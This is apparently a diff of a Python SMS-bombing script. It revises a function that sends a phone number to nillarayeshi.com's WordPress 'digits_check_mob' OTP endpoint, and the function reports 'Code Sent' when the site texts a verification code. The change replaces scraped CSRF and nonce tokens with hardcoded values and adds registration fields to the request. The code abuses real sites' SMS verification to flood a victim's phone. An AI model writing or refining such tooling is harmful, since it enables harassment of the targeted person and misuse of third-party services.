@@ -94,55 +94,14 @@ def Balad(phone):
 
 def nillarayeshi(phone):
     try:
-        formatted_phone = re.sub(r'[^0-9]', '', phone.replace("+98", ""))
-        session = requests.Session()
+        formatted_phone = "0" + phone.replace("+98", "")
         
-        # دریافت صفحه اصلی با هدرهای کامل
-        headers = {
-            "User-Agent": random.choice(user_agents),
-            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8",
-            "Accept-Language": "en-US,en;q=0.5",
-            "Accept-Encoding": "gzip, deflate, br",
-            "Connection": "keep-alive",
-            "Upgrade-Insecure-Requests": "1",
-        }
+        # استفاده از مقادیر ثابت از درخواست واقعی
+        csrf = "2a49f89a8f"
+        nonce = "2a49f89a8f"
         
-        home_response = session.get(
-            "https://nillarayeshi.com/", 
-            timeout=15, 
-            headers=headers,
-            verify=False
-        )
-        home_response.encoding = 'utf-8'
+        url = "https://nillarayeshi.com/wp-admin/admin-ajax.php"
         
-        print(f'{y}[Debug] Page length: {len(home_response.text)} characters{a}')
-        
-        # الگوهای مختلف برای استخراج توکن‌ها
-        token_patterns = [
-            r'name="csrf" value="([^"]+)"',
-            r'name="dig_nounce" value="([^"]+)"',
-            r'var nonce = "([^"]+)"',
-            r'name="_wpnonce" value="([^"]+)"',
-            r'name="security" value="([^"]+)"'
-        ]
-        
-        csrf, nonce = "", ""
-        for pattern in token_patterns:
-            match = re.search(pattern, home_response.text)
-            if match:
-                if "csrf" in pattern or "security" in pattern or "_wpnonce" in pattern:
-                    csrf = match.group(1)
-                elif "nonce" in pattern or "dig_nounce" in pattern:
-                    nonce = match.group(1)
-        
-        if not csrf or not nonce:
-            print(f'{r}[-] nillarayeshi: Could not extract tokens{a}')
-            print(f'{y}[Debug] First 500 chars: {home_response.text[:500]}{a}')
-            return False
-        
-        print(f'{g}[+] Found CSRF: {csrf}, Nonce: {nonce}{a}')
-        
-        # پارامترهای کامل‌تر
         payload = {
             "action": "digits_check_mob",
             "countrycode": "+98",
@@ -156,6 +115,15 @@ def nillarayeshi(phone):
             "digits": "1",
             "json": "1",
             "whatsapp": "0",
+            "digits_reg_name": "نام",
+            "digregcode": "+98",
+            "digits_reg_mail": formatted_phone,
+            "digregscode2": "+98",
+            "mobmail2": "",
+            "digits_reg_password": "",
+            "dig_otp": "",
+            "code": "",
+            "dig_reg_mail": "",
             "dig_nounce": nonce
         }
         
@@ -165,27 +133,21 @@ def nillarayeshi(phone):
             "X-Requested-With": "XMLHttpRequest",
             "Origin": "https://nillarayeshi.com",
             "Referer": "https://nillarayeshi.com/",
-            "Accept": "application/json, text/javascript, */*; q=0.01",
+            "Accept": "*/*",
             "Accept-Language": "en-US,en;q=0.9,fa;q=0.8",
         }
         
-        response = session.post(
-            "https://nillarayeshi.com/wp-admin/admin-ajax.php",
-            data=payload,
-            headers=headers,
-            timeout=15,
-            verify=False
-        )
+        response = requests.post(url, data=payload, headers=headers, timeout=15)
         
-        print(f'{y}[Debug] Response Status: {response.status_code}{a}')
-        print(f'{y}[Debug] Response Text: {response.text[:300]}{a}')
+        print(f'{y}[Debug] Status: {response.status_code}{a}')
+        print(f'{y}[Debug] Response: {response.text}{a}')
         
         if response.status_code == 200:
-            if any(x in response.text.lower() for x in ["success", "1", "true", "sent"]):
+            if response.text.strip() == "1" or "success" in response.text.lower():
                 print(f'{g}(nillarayeshi) Code Sent{a}')
                 return True
             else:
-                print(f'{r}[-] nillarayeshi: Server returned failure{a}')
+                print(f'{r}[-] nillarayeshi: Server returned {response.text}{a}')
                 return False
         else:
             print(f'{r}[-] nillarayeshi: HTTP Error {response.status_code}{a}')
